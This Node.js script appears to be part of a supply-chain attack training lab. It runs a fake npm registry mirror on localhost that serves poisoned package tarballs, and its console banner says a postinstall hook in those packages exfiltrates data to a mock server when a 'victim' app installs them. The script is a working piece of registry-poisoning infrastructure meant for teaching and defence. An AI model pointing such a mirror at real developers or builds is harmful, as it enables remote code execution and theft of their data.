#!/usr/bin/env node
// SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
/**
 * Scenario 11 — Compromised Registry Mirror Server
 *
 * Speaks the npm registry protocol on port 4873 and serves malicious
 * tarballs pre-built by build-registry.js.  When corporate-app/ runs
 *   npm install --registry http://localhost:4873/
 * npm fetches metadata and tarballs from HERE — the poisoned mirror.
 *
 * Endpoints (npm registry protocol subset):
 *   GET /<pkg>                       → package metadata JSON
 *   GET /<pkg>/-/<pkg>-<ver>.tgz    → tarball binary
 *
 * Start BEFORE running `npm install` in corporate-app/:
 *   node infrastructure/registry-server.js
 */

'use strict';

const http = require('http');
const fs   = require('fs');
const path = require('path');

const PORT        = 4873;
const WORK_DIR    = path.join(__dirname, '../work');
const TARBALLS    = path.join(WORK_DIR, 'tarballs');
const META_FILE   = path.join(WORK_DIR, 'registry-meta.json');

if (!fs.existsSync(META_FILE)) {
  console.error('[registry] work/registry-meta.json not found.');
  console.error('[registry] Run setup.sh (or node infrastructure/build-registry.js) first.');
  process.exit(1);
}

const registryData = JSON.parse(fs.readFileSync(META_FILE, 'utf8'));
const pkgNames     = Object.keys(registryData);

const server = http.createServer((req, res) => {
  // Decode percent-encoding so %2F → / (used by npm for scoped packages)
  const urlPath = decodeURIComponent(req.url.split('?')[0]);

  if (req.method !== 'GET') {
    res.writeHead(405); res.end('Method Not Allowed'); return;
  }

  // Tarball request pattern: /<pkg-name>/-/<tarball-name>.tgz
  const tarMatch = urlPath.match(/^\/(.+)\/-\/(.+\.tgz)$/);
  if (tarMatch) {
    const tarName = tarMatch[2];
    const tarPath = path.join(TARBALLS, tarName);
    if (fs.existsSync(tarPath)) {
      const data = fs.readFileSync(tarPath);
      console.log(`[registry] 200 tarball → ${tarName}`);
      res.writeHead(200, {
        'Content-Type':   'application/octet-stream',
        'Content-Length': data.length,
      });
      res.end(data);
    } else {
      console.log(`[registry] 404 tarball → ${tarName}`);
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'tarball not found' }));
    }
    return;
  }

  // Package metadata: /<pkg-name>
  const pkgName = urlPath.slice(1); // strip leading /
  if (registryData[pkgName]) {
    console.log(`[registry] 200 metadata → ${pkgName}`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(registryData[pkgName]));
    return;
  }

  // Not in our poisoned set — return 404 so npm falls through to upstream
  console.log(`[registry] 404 → ${pkgName}`);
  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Not found' }));
});

server.listen(PORT, '127.0.0.1', () => {
  console.log('');
  console.log('☠️   Compromised Registry Mirror — Scenario 11');
  console.log('─'.repeat(50));
  console.log(`Listening: http://localhost:${PORT}/`);
  console.log(`Poisoned packages: ${pkgNames.join(', ')}`);
  console.log('');
  console.log('Configure npm to use this mirror:');
  console.log(`  npm install --registry http://localhost:${PORT}/`);
  console.log('  (or set registry= in corporate-app/.npmrc)');
  console.log('');
  console.log('When the victim runs npm install from corporate-app/:');
  console.log('  → This server serves the POISONED tarballs');
  console.log('  → postinstall runs → data exfiltrated to mock server :3000');
  console.log('─'.repeat(50));
});
